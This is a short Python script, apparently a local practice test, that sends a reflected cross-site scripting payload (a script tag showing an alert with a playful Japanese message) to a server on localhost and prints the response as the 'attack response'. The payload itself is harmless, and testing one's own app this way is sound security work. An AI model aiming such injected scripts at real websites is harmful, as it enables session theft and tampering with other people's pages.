import requests

def send_xss_attack():
    target_url = "http://localhost:5000"
    payload = '<script>alert("９９９号しゅつげん♡");</script>'
    response = requests.get(target_url, params={"name": payload})
    print("🎯 攻撃レスポンス：")
    print(response.text)

if __name__ == "__main__":
    send_xss_attack()